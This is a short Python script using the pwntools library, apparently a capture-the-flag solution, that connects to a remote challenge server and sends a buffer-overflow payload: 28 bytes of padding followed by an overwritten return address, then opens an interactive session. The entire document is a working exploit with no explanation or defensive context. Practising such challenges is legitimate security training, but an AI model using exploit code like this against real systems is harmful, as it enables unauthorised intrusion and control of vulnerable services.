from pwn import *

p = remote("cyberyoddha.baycyber.net", 10002)

buf = b''
buf += b'A'*28
buf += p32(0x8049172)

p.sendline(buf)

p.interactive()
